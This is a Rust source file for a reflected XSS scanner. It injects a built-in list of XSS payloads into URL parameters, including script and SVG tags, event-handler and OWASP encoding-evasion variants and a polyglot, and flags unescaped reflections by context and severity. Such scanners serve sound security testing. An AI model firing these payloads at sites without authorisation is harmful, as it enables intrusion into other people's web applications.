// xss.rs - Advanced XSS (Cross-Site Scripting) Scanner
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::{Duration, Instant};
use tokio::sync::Semaphore;
use std::sync::Arc;
use url::Url;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssConfig {
    pub target: String,
    pub max_concurrency: usize,
    pub timeout_secs: u64,
    pub cookies: Option<String>,
    pub custom_headers: HashMap<String, String>,
    pub follow_redirects: bool,
    pub test_reflected: bool,
    pub test_stored: bool,
    pub test_dom: bool,
    pub max_depth: usize,
    pub user_agent: String,
}

impl Default for XssConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            max_concurrency: 10,
            timeout_secs: 30,
            cookies: None,
            custom_headers: HashMap::new(),
            follow_redirects: true,
            test_reflected: true,
            test_stored: true,
            test_dom: true,
            max_depth: 3,
            user_agent: "Mozilla/5.0 (XSS Scanner)".to_string(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum XssType {
    Reflected,
    Stored,
    DOM,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Copy)]
pub enum XssContext {
    HTML,
    Attribute,
    Script,
    URL,
    Style,
    Unknown,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XssVulnerability {
    pub url: String,
    pub parameter: String,
    pub xss_type: XssType,
    pub context: XssContext,
    pub payload: String,
    pub evidence: String,
    pub severity: Severity,
    pub method: HttpMethod,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum Severity {
    Critical,
    High,
    Medium,
    Low,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum HttpMethod {
    GET,
    POST,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct XssScanResult {
    pub target: String,
    pub vulnerabilities: Vec<XssVulnerability>,
    pub tested_endpoints: usize,
    pub tested_parameters: usize,
    pub duration_secs: f64,
    pub scan_timestamp: String,
}

pub struct XssScanner {
    config: XssConfig,
    client: Client,
}

impl XssScanner {
    pub fn new(config: XssConfig) -> Self {
        let mut client_builder = Client::builder()
            .timeout(Duration::from_secs(config.timeout_secs))
            .redirect(if config.follow_redirects {
                reqwest::redirect::Policy::limited(10)
            } else {
                reqwest::redirect::Policy::none()
            });

        // Add custom headers
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(
            reqwest::header::USER_AGENT,
            config.user_agent.parse().unwrap(),
        );

        for (key, value) in &config.custom_headers {
            if let (Ok(name), Ok(val)) = (
                reqwest::header::HeaderName::from_bytes(key.as_bytes()),
                reqwest::header::HeaderValue::from_str(value),
            ) {
                headers.insert(name, val);
            }
        }

        if let Some(ref cookies) = config.cookies {
            headers.insert(
                reqwest::header::COOKIE,
                cookies.parse().unwrap(),
            );
        }

        client_builder = client_builder.default_headers(headers);

        let client = client_builder.build().unwrap();

        Self { config, client }
    }

    /// Main scanning function
    pub async fn scan(&self) -> Result<XssScanResult, Box<dyn std::error::Error>> {
        let start_time = Instant::now();

        println!("\n{}", "=".repeat(70));
        println!("  XSS VULNERABILITY SCANNER");
        println!("{}", "=".repeat(70));
        println!("Target: {}", self.config.target);
        println!("Max Concurrency: {}", self.config.max_concurrency);
        println!("Test Types: {}{}{}",
            if self.config.test_reflected { "Reflected " } else { "" },
            if self.config.test_stored { "Stored " } else { "" },
            if self.config.test_dom { "DOM " } else { "" }
        );
        println!("{}\n", "=".repeat(70));

        // Discover endpoints with parameters
        println!("[*] Phase 1: Endpoint Discovery");
        let endpoints = self.discover_endpoints().await?;
        println!("[+] Found {} testable endpoints", endpoints.len());

        // Test for XSS vulnerabilities
        println!("\n[*] Phase 2: XSS Detection");
        let vulnerabilities = self.test_endpoints(endpoints.clone()).await;

        let duration = start_time.elapsed().as_secs_f64();

        Ok(XssScanResult {
            target: self.config.target.clone(),
            vulnerabilities: vulnerabilities.clone(),
            tested_endpoints: endpoints.len(),
            tested_parameters: vulnerabilities.len(),
            duration_secs: duration,
            scan_timestamp: chrono::Local::now().to_rfc3339(),
        })
    }

    /// Discover endpoints with parameters
    async fn discover_endpoints(&self) -> Result<Vec<TestEndpoint>, Box<dyn std::error::Error>> {
        let mut endpoints = Vec::new();

        // Parse base URL
        let base_url = Url::parse(&self.config.target)?;

        // Test the target URL itself if it has parameters
        if let Some(query) = base_url.query() {
            let params: Vec<(String, String)> = url::form_urlencoded::parse(query.as_bytes())
                .into_owned()
                .collect();

            if !params.is_empty() {
                endpoints.push(TestEndpoint {
                    url: self.config.target.clone(),
                    method: HttpMethod::GET,
                    parameters: params.iter().map(|(k, _)| k.clone()).collect(),
                });
            }
        }

        // TODO: Add web crawler to discover more endpoints
        // For now, we'll test the provided URL

        Ok(endpoints)
    }

    /// Test endpoints for XSS vulnerabilities
    async fn test_endpoints(&self, endpoints: Vec<TestEndpoint>) -> Vec<XssVulnerability> {
        let vulnerabilities = Arc::new(tokio::sync::RwLock::new(Vec::new()));
        let semaphore = Arc::new(Semaphore::new(self.config.max_concurrency));
        let mut tasks = Vec::new();

        for endpoint in endpoints {
            for param in &endpoint.parameters {
                let sem = semaphore.clone();
                let scanner = self.clone();
                let endpoint = endpoint.clone();
                let param = param.clone();
                let vulns = vulnerabilities.clone();

                let task = tokio::spawn(async move {
                    let _permit = sem.acquire().await.unwrap();

                    println!("[*] Testing parameter '{}' in {}", param, endpoint.url);

                    if let Some(vuln) = scanner.test_parameter(&endpoint, &param).await {
                        println!("[+] XSS FOUND: {} in parameter '{}'", endpoint.url, param);
                        let mut v = vulns.write().await;
                        v.push(vuln);
                    }
                });

                tasks.push(task);
            }
        }

        // Wait for all tests to complete
        for task in tasks {
            let _ = task.await;
        }

        let vulns = vulnerabilities.read().await;
        vulns.clone()
    }

    /// Test a single parameter for XSS
    async fn test_parameter(&self, endpoint: &TestEndpoint, param: &str) -> Option<XssVulnerability> {
        // Get payloads based on configuration
        let payloads = self.get_payloads();

        for payload in payloads {
            if self.config.test_reflected {
                if let Some(vuln) = self.test_reflected_xss(endpoint, param, &payload).await {
                    return Some(vuln);
                }
            }

            // Add small delay between tests
            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        None
    }

    /// Test for reflected XSS
    async fn test_reflected_xss(
        &self,
        endpoint: &TestEndpoint,
        param: &str,
        payload: &XssPayload,
    ) -> Option<XssVulnerability> {
        let test_url = self.inject_payload(&endpoint.url, param, &payload.payload);

        println!("[DEBUG] Testing: {}", payload.description);
        println!("[DEBUG] URL: {}", test_url);

        match self.client.get(&test_url).send().await {
            Ok(response) => {
                let status = response.status();
                if let Ok(body) = response.text().await {
                    println!("[DEBUG] Response length: {} bytes, Status: {}", body.len(), status);

                    // Check if payload appears unescaped in response
                    if self.is_vulnerable(&body, &payload.payload, &payload.detection_pattern) {
                        let context = self.detect_context(&body, &payload.payload);

                        println!("[+] VULNERABLE! Payload: {}", payload.payload);
                        println!("[+] Context: {:?}", context);

                        return Some(XssVulnerability {
                            url: endpoint.url.clone(),
                            parameter: param.to_string(),
                            xss_type: XssType::Reflected,
                            context,
                            payload: payload.payload.clone(),
                            evidence: self.extract_evidence(&body, &payload.payload),
                            severity: self.calculate_severity(&context),
                            method: endpoint.method.clone(),
                        });
                    } else {
                        println!("[DEBUG] Not vulnerable - payload escaped or not found");
                        // Show snippet of response for debugging
                        if body.len() > 200 {
                            println!("[DEBUG] Response snippet: {}...", &body[..200]);
                        } else {
                            println!("[DEBUG] Response: {}", body);
                        }
                    }
                }
            }
            Err(e) => {
                println!("[!] Error testing {}: {}", test_url, e);
            }
        }

        None
    }

    /// Inject payload into URL parameter
    fn inject_payload(&self, url: &str, param: &str, payload: &str) -> String {
        if let Ok(mut parsed_url) = Url::parse(url) {
            // Parse existing query parameters
            let mut params: Vec<(String, String)> = parsed_url
                .query_pairs()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect();

            // Replace the target parameter with payload
            for (key, value) in &mut params {
                if key == param {
                    *value = payload.to_string();
                }
            }

            // Rebuild query string
            let query_string: String = params
                .iter()
                .map(|(k, v)| format!("{}={}", k, urlencoding::encode(v)))
                .collect::<Vec<_>>()
                .join("&");

            parsed_url.set_query(Some(&query_string));
            parsed_url.to_string()
        } else {
            url.to_string()
        }
    }

    /// Check if response is vulnerable
    fn is_vulnerable(&self, body: &str, payload: &str, detection_pattern: &str) -> bool {
        // Check for exact payload (unescaped)
        if body.contains(payload) {
            return true;
        }

        // Check for detection pattern (e.g., specific string in executed JS)
        if !detection_pattern.is_empty() && body.contains(detection_pattern) {
            return true;
        }

        false
    }

    /// Detect XSS context
    fn detect_context(&self, body: &str, payload: &str) -> XssContext {
        if let Some(pos) = body.find(payload) {
            let before = &body[pos.saturating_sub(50)..pos];
            let after = &body[pos..std::cmp::min(pos + 100, body.len())];

            // Check if inside script tag
            if before.rfind("<script").is_some() && after.find("</script>").is_some() {
                return XssContext::Script;
            }

            // Check if inside HTML attribute
            if before.rfind('=').is_some() && after.find('>').is_some() {
                return XssContext::Attribute;
            }

            // Check if inside style tag
            if before.rfind("<style").is_some() && after.find("</style>").is_some() {
                return XssContext::Style;
            }

            // Check if in URL context
            if before.contains("href=") || before.contains("src=") {
                return XssContext::URL;
            }

            return XssContext::HTML;
        }

        XssContext::Unknown
    }

    /// Extract evidence from response
    fn extract_evidence(&self, body: &str, payload: &str) -> String {
        if let Some(pos) = body.find(payload) {
            let start = pos.saturating_sub(100);
            let end = std::cmp::min(pos + payload.len() + 100, body.len());
            body[start..end].to_string()
        } else {
            String::new()
        }
    }

    /// Calculate severity based on context
    fn calculate_severity(&self, context: &XssContext) -> Severity {
        match context {
            XssContext::Script => Severity::Critical,
            XssContext::HTML => Severity::High,
            XssContext::Attribute => Severity::High,
            XssContext::URL => Severity::Medium,
            XssContext::Style => Severity::Low,
            XssContext::Unknown => Severity::Low,
        }
    }

    /// Get XSS payloads
    fn get_payloads(&self) -> Vec<XssPayload> {
        vec![
            // Basic payloads
            XssPayload {
                payload: "<script>alert(1)</script>".to_string(),
                detection_pattern: "".to_string(),
                description: "Basic script tag".to_string(),
            },
            XssPayload {
                payload: "<SCRIPT>alert(1)</SCRIPT>".to_string(),
                detection_pattern: "".to_string(),
                description: "Case variation".to_string(),
            },
            XssPayload {
                payload: "<img src=x onerror=alert(1)>".to_string(),
                detection_pattern: "".to_string(),
                description: "Image tag with onerror".to_string(),
            },
            XssPayload {
                payload: "<svg/onload=alert(1)>".to_string(),
                detection_pattern: "".to_string(),
                description: "SVG with onload".to_string(),
            },
            XssPayload {
                payload: "<body onload=alert(1)>".to_string(),
                detection_pattern: "".to_string(),
                description: "Body onload".to_string(),
            },
            XssPayload {
                payload: "<iframe src=javascript:alert(1)>".to_string(),
                detection_pattern: "".to_string(),
                description: "IFrame with javascript protocol".to_string(),
            },
            XssPayload {
                payload: "<input onfocus=alert(1) autofocus>".to_string(),
                detection_pattern: "".to_string(),
                description: "Input with autofocus".to_string(),
            },
            XssPayload {
                payload: "<select onfocus=alert(1) autofocus>".to_string(),
                detection_pattern: "".to_string(),
                description: "Select with autofocus".to_string(),
            },
            XssPayload {
                payload: "<marquee onstart=alert(1)>".to_string(),
                detection_pattern: "".to_string(),
                description: "Marquee with onstart".to_string(),
            },
            XssPayload {
                payload: "<details open ontoggle=alert(1)>".to_string(),
                detection_pattern: "".to_string(),
                description: "Details with ontoggle".to_string(),
            },
            // OWASP recommended evasion techniques
            XssPayload {
                payload: r#"<IMG SRC=javascript:alert('XSS')>"#.to_string(),
                detection_pattern: "".to_string(),
                description: "IMG with javascript protocol".to_string(),
            },
            XssPayload {
                payload: r#"<IMG SRC=JaVaScRiPt:alert('XSS')>"#.to_string(),
                detection_pattern: "".to_string(),
                description: "Case variation javascript".to_string(),
            },
            XssPayload {
                payload: r#"<IMG SRC=`javascript:alert("XSS")`>"#.to_string(),
                detection_pattern: "".to_string(),
                description: "Grave accent delimiters".to_string(),
            },
            XssPayload {
                payload: r#"<IMG """><SCRIPT>alert("XSS")</SCRIPT>">"#.to_string(),
                detection_pattern: "".to_string(),
                description: "Malformed IMG tags".to_string(),
            },
            XssPayload {
                payload: "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>".to_string(),
                detection_pattern: "".to_string(),
                description: "fromCharCode encoding".to_string(),
            },
            XssPayload {
                payload: r#"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"#.to_string(),
                detection_pattern: "".to_string(),
                description: "HTML entities encoding".to_string(),
            },
            XssPayload {
                payload: r#"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"#.to_string(),
                detection_pattern: "".to_string(),
                description: "Long UTF-8 encoding".to_string(),
            },
            XssPayload {
                payload: r#"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"#.to_string(),
                detection_pattern: "".to_string(),
                description: "Hex encoding".to_string(),
            },
            // Embedded tabs and newlines (OWASP)
            XssPayload {
                payload: "<IMG SRC=\"jav\tascript:alert('XSS');\">".to_string(),
                detection_pattern: "".to_string(),
                description: "Embedded tab".to_string(),
            },
            XssPayload {
                payload: "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">".to_string(),
                detection_pattern: "".to_string(),
                description: "Embedded encoded tab".to_string(),
            },
            XssPayload {
                payload: "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">".to_string(),
                detection_pattern: "".to_string(),
                description: "Embedded newline".to_string(),
            },
            // No quotes and no semicolon (OWASP)
            XssPayload {
                payload: "<IMG SRC=javascript:alert('XSS')>".to_string(),
                detection_pattern: "".to_string(),
                description: "No quotes IMG".to_string(),
            },
            // Event handlers
            XssPayload {
                payload: r#"<IMG SRC=x onError="alert('XSS')">"#.to_string(),
                detection_pattern: "".to_string(),
                description: "onError with quotes".to_string(),
            },
            XssPayload {
                payload: "<IMG SRC=x onerror=alert('XSS')>".to_string(),
                detection_pattern: "".to_string(),
                description: "onError without quotes".to_string(),
            },
            // SVG variations (OWASP)
            XssPayload {
                payload: r#"<svg><script>alert('XSS')</script></svg>"#.to_string(),
                detection_pattern: "".to_string(),
                description: "SVG with script".to_string(),
            },
            XssPayload {
                payload: r#"<svg onload=alert('XSS')>"#.to_string(),
                detection_pattern: "".to_string(),
                description: "SVG onload".to_string(),
            },
            // Polyglot payloads
            XssPayload {
                payload: r#"'><script>alert(String.fromCharCode(88,83,83))</script>"#.to_string(),
                detection_pattern: "".to_string(),
                description: "Polyglot (works in multiple contexts)".to_string(),
            },
        ]
    }
}

impl Clone for XssScanner {
    fn clone(&self) -> Self {
        Self {
            config: self.config.clone(),
            client: self.client.clone(),
        }
    }
}

#[derive(Debug, Clone)]
struct XssPayload {
    payload: String,
    detection_pattern: String,
    description: String,
}

#[derive(Debug, Clone)]
struct TestEndpoint {
    url: String,
    method: HttpMethod,
    parameters: Vec<String>,
}

/// Print scan results
pub fn print_results(results: &XssScanResult) {
    println!("\n{}", "=".repeat(70));
    println!("  XSS SCAN RESULTS");
    println!("{}", "=".repeat(70));
    println!("Target: {}", results.target);
    println!("Scan Duration: {:.2} seconds", results.duration_secs);
    println!("Tested Endpoints: {}", results.tested_endpoints);
    println!("Vulnerabilities Found: {}", results.vulnerabilities.len());
    println!("{}", "=".repeat(70));

    if results.vulnerabilities.is_empty() {
        println!("\n✓ No XSS vulnerabilities detected!");
    } else {
        println!("\n⚠️  VULNERABILITIES FOUND:\n");

        for (i, vuln) in results.vulnerabilities.iter().enumerate() {
            println!("{}. [{:?}] {:?} XSS", i + 1, vuln.severity, vuln.xss_type);
            println!("   URL: {}", vuln.url);
            println!("   Parameter: {}", vuln.parameter);
            println!("   Context: {:?}", vuln.context);
            println!("   Payload: {}", vuln.payload);
            println!("   Evidence: {}...", &vuln.evidence[..vuln.evidence.len().min(100)]);
            println!();
        }
    }

    println!("{}", "=".repeat(70));
}